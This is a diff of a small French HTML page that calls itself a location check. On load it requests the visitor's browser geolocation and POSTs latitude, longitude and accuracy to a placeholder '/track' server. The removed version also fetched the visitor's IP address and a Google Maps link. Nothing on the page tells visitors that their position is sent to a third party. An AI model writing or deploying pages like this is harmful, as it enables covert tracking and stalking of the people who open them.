@@ -3,50 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Localisation & Envoi Email</title>
+    <title>Vérification de la localisation</title>
     <script>
-        async function getIP() {
-            try {
-                let response = await fetch('https://api64.ipify.org?format=json');
-                let data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error("Erreur de récupération de l'IP :", error);
-                return "IP inconnue";
-            }
-        }
-
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const ip = await getIP();
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-
-                    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                    const data = { ip, latitude, longitude, accuracy, googleMapsLink };
-
-                    fetch('https://ton-serveur-heroku.herokuapp.com/track', { // 🔴 MODIFIE L'URL ICI !
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
-                    })
-                    .then(response => response.json())
-                    .then(data => console.log("Données envoyées :", data))
-                    .catch(error => console.error("Erreur :", error));
-                }, handleError);
+                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
             } else {
                 alert("La géolocalisation n'est pas supportée par ce navigateur.");
             }
         }
 
+        function sendLocation(position) {
+            const data = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy
+            };
+
+            // Envoi des données à l'API backend (Node.js)
+            fetch('https://tonserveur.render.com/track', {  // Remplace par l'URL de ton application Render
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Données envoyées avec succès", data);
+            })
+            .catch(error => {
+                console.error("Erreur lors de l'envoi des données", error);
+            });
+        }
+
         function handleError(error) {
             alert("Erreur de géolocalisation : " + error.message);
         }
+
+        // Demander la localisation quand la page est chargée
+        window.onload = function() {
+            getLocation();
+        };
     </script>
 </head>
-<body onload="getLocation()">
-    <h1>Vérification de la localisation...</h1>
+<body>
+    <h1>Vérification de l'accès à la localisation...</h1>
 </body>
 </html>
